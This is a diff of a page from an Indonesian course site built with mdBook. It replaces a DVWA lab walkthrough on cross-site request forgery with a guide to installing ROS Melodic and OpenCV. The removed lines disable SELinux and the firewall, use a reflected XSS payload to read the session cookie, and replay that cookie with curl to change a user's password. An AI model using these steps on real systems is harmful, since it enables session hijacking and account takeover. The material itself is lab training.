@@ -6,7 +6,7 @@
     <meta charset="UTF-8">
 
     <!-- ----------------------------------------------- DIGANTI JUDUL ----------------------------------------------- -->
-    <title>DVWA XSRF</title>
+    <title>ROS & Opencv</title>
     <!-- ----------------------------------------------# DIGANTI JUDUL #---------------------------------------------- -->
 
 
@@ -68,7 +68,7 @@
             if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                 localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
             }
-        } catch (e) {}
+        } catch (e) { }
     </script>
 
     <!-- Set the theme before any content is loaded, prevents flash -->
@@ -76,7 +76,7 @@
         var theme;
         try {
             theme = localStorage.getItem('mdbook-theme');
-        } catch (e) {}
+        } catch (e) { }
         if (theme === null || theme === undefined) {
             theme = default_theme;
         }
@@ -94,7 +94,7 @@
         if (document.body.clientWidth >= 1080) {
             try {
                 sidebar = localStorage.getItem('mdbook-sidebar');
-            } catch (e) {}
+            } catch (e) { }
             sidebar = sidebar || 'visible';
         }
         html.classList.remove('sidebar-visible');
@@ -167,7 +167,7 @@
                             <li class="chapter-item expanded "><a href="../02-cybersec/dvwasqli.html"><span>2.18.2. SQL Injection</span></a></li>
                             <li class="chapter-item expanded "><a href="../02-cybersec/dvwaupv.html"><span>2.18.3. Upload Vuln</span></a></li>
                             <li class="chapter-item expanded "><a href="../02-cybersec/dvwaxss.html"><span>2.18.4. XSS</span></a></li>
-                            <li class="chapter-item expanded "><a href="../02-cybersec/dvwaxsrf.html" style="color: rgb(255, 115, 138);"><span>2.18.4. XSRF</span></a></li>
+                            <li class="chapter-item expanded "><a href="../02-cybersec/dvwaxsrf.html"><span>2.18.4. XSRF</span></a></li>
                         </ol>
                     </li>
                     <li class="chapter-item expanded "><span><strong aria-hidden="true">2.19.</strong> Dasar Pengamanan Server </span></li>
@@ -293,7 +293,7 @@
                     <li class="chapter-item expanded "><a href="../04-tips/lug.html"><span><strong aria-hidden="true">6.10.</strong> List Users & Groups </span></a></li>
                     <li class="chapter-item expanded "><a href="../04-tips/replonno.html"><span><strong aria-hidden="true">6.11.</strong> Replikasi Onnocenter </span></a></li>
                     <li class="chapter-item expanded "><a href="../04-tips/moodle.html"><span><strong aria-hidden="true">6.12.</strong> Install Moodle </span></a></li>
-                    <li class="chapter-item expanded "><a href="../04-tips/rosopencv.html"><span><strong aria-hidden="true">6.13.</strong> Install ROS & Opencv</span></a></li>
+                    <li class="chapter-item expanded "><a href="../04-tips/rosopencv.html" style="color: rgb(255, 115, 138);"><span><strong aria-hidden="true">6.13.</strong> Install ROS & Opencv</span></a></li>
                     <li class="chapter-item expanded "><a href="../04-tips/ros.html"><span><strong aria-hidden="true">6.14.</strong> Install ROS</span></a></li>
                     <li>
                         <ol class="section">
@@ -342,7 +342,7 @@
 
                 </div>
                 <!-- ----------------------------------------------- DIGANTI MENU TITLE ----------------------------------------------- -->
-                <h1 class="menu-title">DVWA XSRF</h1>
+                <h1 class="menu-title">Install ROS Melodic & Opencv</h1>
                 <!-- ----------------------------------------------# DIGANTI MENU TITLE #---------------------------------------------- -->
 
                 <div class="right-buttons">
@@ -383,60 +383,80 @@
             <div id="content" class="content">
                 <main>
                     <!-- ----------------------------------------------- DIGANTI MENU ----------------------------------------------- -->
-                    <h1><a class="header" href="#intro" id="intro">Cross Site Request Forgery</a></h1>
-                    Server :
+                    <h1><a class="header" href="#intro" id="intro">Install ROS Melodic & Opencv Ubuntu 18.04</a></h1>
+                    <p>
+                        1. Install ROS Melodic :
                     <ul>
-                        <pre><code>sestatus</code></pre>
-                        If SELinux status: is set to disabled OR if Current mode: is set to permissive, then skip the
-                        next steps, and Continue to the Next Section. <br>
-                        If SELinux status: is set to enabled AND if Current mode: is set to enforcing, then Continue the
-                        next steps.
-                        <br><br>
-                        Place selinux harusnya mode disable
-                        <br><br>
-                        ubah current mode permissive :
-                        <pre><code>echo 0 > /selinux/enforce</code></pre>
+                        <pre><code>sudo sh -c 'echo "deb http://packages.ros.org/ros/ubuntu $(lsb_release -sc) main" > /etc/apt/sources.list.d/ros-latest.list'
+sudo apt-key adv --keyserver 'hkp://keyserver.ubuntu.com:80' --recv-key C1CF6E31E6BADE8868B172B4F42ED6FBAB17C654
+sudo apt update
+sudo apt install ros-melodic-desktop-full
+echo "source /opt/ros/melodic/setup.bash" >> ~/.bashrc
+source ~/.bashrc
+sudo apt install python-rosdep python-rosinstall python-rosinstall-generator python-wstool build-essential
+sudo rosdep init
+rosdep update</code></pre>
+                    </ul>
+                    2. Create catkin workspace :
+                    <ul>
+                        <pre><code>mkdir -p ~/catkin_ws/src
+cd ~/catkin_ws
+catkin_make
+echo "source ~/catkin_ws/devel/setup.bash" >> ~/.bashrc
+source ~/.bashrc
+# Install rosbridge-suite
+sudo apt-get install ros-melodic-rosbridge-server
+sudo apt-get install cmake-qt-gui
+</code></pre>
+                    </ul>
+                    3. Install Library yang diperlukan :
+                    <ul>
+                        <pre><code>sudo apt-get install libfontconfig1-dev libdbus-1-dev libfreetype6-dev libudev-dev libicu-dev libsqlite3-dev libxslt1-dev libssl-dev libasound2-dev libavcodec-dev libavformat-dev libswscale-dev libgles2-mesa-dev libxcb-icccm4-dev libxcb-image0-dev libxcb-keysyms1-dev libxcb-xinerama0-dev libprotobuf-dev libleveldb-dev libsnappy-dev libhdf5-serial-dev protobuf-compiler libopenblas-dev liblapack-dev libopenblas-dev liblapack-dev libgflags-dev libgoogle-glog-dev liblmdb-dev cmake cmake-gui gfortran  liblapack-dev libblas-dev libatlas-base-dev libarpack2-dev libarpack++2-dev</code></pre>
+                    </ul>
+                    4. download opencv di google, versi terserah, lalu extract
+                    <br><br>
+                    5. Clone contoh project :
+                    <ul>
+                        <pre><code>cd ~/Download
+git clone https://github.com/fpt-corp/ROS_Package_example.git</code></pre>
+jika mendownlad, maka extract dulu
+                    </ul>
+                    6.
+                    <ul>
+                        <pre><code>cd ~/Download/opencv
+mkdir build</code></pre>
+                    </ul>
+                    7. Buka cmake
+                    <br><br>
+                    8. 
+                    <ul>
+                        browse source -> opencv <br>
+                        browse build -> build <br>
+                        configure <br>
+                        generate <br>
+                    </ul>
+                    9.
+                    <ul>
+                        <pre><code>cd ~/Download/opencv/build
+make -j16
+sudo make install</code></pre>
+                    </ul>
+                    10.
+                    <ul>
+                        <pre><code>cd ~/Download/ROS_Package_example/
+# copy semua folder ke ~/catkin_ws/src/</code></pre>
+                    </ul>
+                    11. restart terminal
+                    <br><br>
+                    12. 
+                    <ul>
+                        <pre><code>cd ~/catkin_ws/
+catkin_make
+roslaunch lane_detect lane_detect.launch</code></pre>
+                    </ul>
+                    13. Ada step selanjutnya, tp ribet pake bgt
+                    </p>
 
-                        disable firewall :
-                        <pre><code>service iptables save
-service iptables stop</code></pre>
-</ul><br>
-Client :
-<ul>
-	Masuk CSRF
-<pre><code>New password: abc123
-Confirm new password: abc123
-Click Change</code></pre>
-
-    copy url setelah ganti password
-<br><br>
-    taruh di text editor / untitled (A)
-<br><br>
-    logout
-<br><br>
-    login dengan password baru
-<br><br>
-    masuk ke XSS reflected
-<pre><code>What's your Name? &lt;script>alert(document.cookie)&lt;/script>
-Click Submit</code></pre>
-
-    copy isi alert nya
-<br><br>
-    paste di file tadi (B)
-<br><br>
-    <code>curl --cookie "B" --location "A"</code> 
-<br><br>
-    jadinya :
-    <pre><code>curl --cookie "security=low; PHPSESSID=3juclcme0enmmhns9t36mi4ij0" --location "http://192.168.43.207/dvwa/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change#"</code></pre>
-
-    ubah password :
-    <pre><code>curl --cookie "security=low; PHPSESSID=3juclcme0enmmhns9t36mi4ij0" --location "http://192.168.43.207/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#"</code></pre>
-
-    masuk terminal
-    <pre><code>&lt;ubah password> | grep "Password Changed" | tee curl.txt</code></pre>
-
-	silahkan logout dan login lagi
-</ul>
                     <!-- ----------------------------------------------# DIGANTI MENU #---------------------------------------------- -->
                 </main>
 
@@ -445,12 +465,12 @@ Click Submit</code></pre>
                     ----------------------------------------------- DIGANTI PREV NEXT -----------------------------------------------
 
                     sebelum
-                    <a rel="prev" href="dvwaxss.html" class="mobile-nav-chapters previous" title="Previous chapter"
+                    <a rel="prev" href="../index.html" class="mobile-nav-chapters previous" title="Previous chapter"
                         aria-label="Previous chapter" aria-keyshortcuts="Left">
                         <i class="fa fa-angle-left"></i>
                     </a>
                     sesudah
-                    <a rel="next" href="vpn.html" class="mobile-nav-chapters next" title="Next chapter"
+                    <a rel="next" href="../index.html" class="mobile-nav-chapters next" title="Next chapter"
                         aria-label="Next chapter" aria-keyshortcuts="Right">
                         <i class="fa fa-angle-right"></i>
                     </a>
@@ -464,12 +484,12 @@ Click Submit</code></pre>
         <!-- <nav class="nav-wide-wrapper" aria-label="Page navigation">
             ----------------------------------------------- DIGANTI PREV NEXT 2 -----------------------------------------------
             sebelum
-            <a rel="prev" href="dvwaxss.html" class="nav-chapters previous" title="Previous chapter"
+            <a rel="prev" href="../index.html" class="nav-chapters previous" title="Previous chapter"
                 aria-label="Previous chapter" aria-keyshortcuts="Left">
                 <i class="fa fa-angle-left"></i>
             </a>
             sesudah
-            <a rel="next" href="vpn.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter"
+            <a rel="next" href="../index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter"
                 aria-keyshortcuts="Right">
                 <i class="fa fa-angle-right"></i>
             </a>
